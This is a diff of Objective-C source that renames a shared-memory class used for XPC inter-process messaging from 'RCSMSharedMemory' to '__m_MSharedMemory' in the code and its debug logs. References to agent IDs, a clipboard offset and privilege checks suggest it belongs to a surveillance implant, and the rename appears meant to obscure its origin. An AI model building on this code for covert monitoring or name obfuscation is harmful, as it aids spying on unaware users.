@@ -184,7 +184,7 @@ static BOOL amIPrivileged()
   return bRet;
 }
 
-@implementation RCSMSharedMemory
+@implementation __m_MSharedMemory
 
 - (id)initWithKey: (int)aKey
              size: (int)aSize
@@ -559,13 +559,13 @@ static BOOL amIPrivileged()
           if (reply == __xpc_error_connection_interrupted) 
             {
 #ifdef DEBUG_SHMEM
-              infoLog(@" [XPC RCSMSharedMemory] xpc error connection interrupted");
+              infoLog(@" [XPC __m_MSharedMemory] xpc error connection interrupted");
 #endif
             } 
           else if (reply == __xpc_error_connection_invalid) 
             {            
 #ifdef DEBUG_SHMEM
-              infoLog(@"[XPC RCSMSharedMemory] xpc error connection invalid");
+              infoLog(@"[XPC __m_MSharedMemory] xpc error connection invalid");
 #endif
             }
         } 
@@ -579,7 +579,7 @@ static BOOL amIPrivileged()
           if (buff == NULL)
             {
 #ifdef DEBUG_SHMEM
-              infoLog(@"[XPC RCSMSharedMemory] xpc error getting raw data");
+              infoLog(@"[XPC __m_MSharedMemory] xpc error getting raw data");
 #endif
             }
           else
@@ -589,11 +589,11 @@ static BOOL amIPrivileged()
 #ifdef DEBUG_SHMEM
               if (anOffset == OFFT_CLIPBOARD)
                 {
-                  infoLog(@"[XPC RCSMSharedMemory] read memory at off %#x", anOffset);
+                  infoLog(@"[XPC __m_MSharedMemory] read memory at off %#x", anOffset);
 
                   shMemoryCommand *cmd = (shMemoryCommand*)buff;
 
-                  infoLog(@"[XPC RCSMSharedMemory] agentID %#x cmd %#x", cmd->agentID, cmd->command);
+                  infoLog(@"[XPC __m_MSharedMemory] agentID %#x cmd %#x", cmd->agentID, cmd->command);
                 }
 #endif
             }
@@ -691,13 +691,13 @@ static BOOL amIPrivileged()
           if (reply == __xpc_error_connection_interrupted) 
             {
 #ifdef DEBUG_SHMEM
-              infoLog(@" [XPC RCSMSharedMemory] xpc error connection interrupted");
+              infoLog(@" [XPC __m_MSharedMemory] xpc error connection interrupted");
 #endif
             } 
           else if (reply == __xpc_error_connection_invalid) 
             {            
 #ifdef DEBUG_SHMEM
-              infoLog(@"[XPC RCSMSharedMemory] xpc error connection invalid");
+              infoLog(@"[XPC __m_MSharedMemory] xpc error connection invalid");
 #endif
             }
         } 
@@ -711,7 +711,7 @@ static BOOL amIPrivileged()
           if (buff == NULL)
             {
 #ifdef DEBUG_SHMEM
-              infoLog(@"[XPC RCSMSharedMemory] xpc error getting raw data");
+              infoLog(@"[XPC __m_MSharedMemory] xpc error getting raw data");
 #endif
             }
           else
@@ -913,14 +913,14 @@ static BOOL amIPrivileged()
       [aData length] == 0)
     {
 #ifdef DEBUG_SHMEM
-      infoLog(@"[XPC RCSMSharedMemory] write memory with aData = nil");
+      infoLog(@"[XPC __m_MSharedMemory] write memory with aData = nil");
 #endif
       return bRet;
     }
   else
     {
 #ifdef DEBUG_SHMEM
-      infoLog(@"[XPC RCSMSharedMemory] writeMemorybyXPC....");
+      infoLog(@"[XPC __m_MSharedMemory] writeMemorybyXPC....");
 #endif
     }
 
@@ -1027,7 +1027,7 @@ static BOOL amIPrivileged()
           if (anOffset >= mSize)
             {
 #ifdef DEBUG_SHMEM
-              infoLog(@"[XPC RCSMSharedMemory] SHMem - write didn't found an available memory block mSize = %#x", mSize);
+              infoLog(@"[XPC __m_MSharedMemory] SHMem - write didn't found an available memory block mSize = %#x", mSize);
 #endif
               return FALSE;
             }
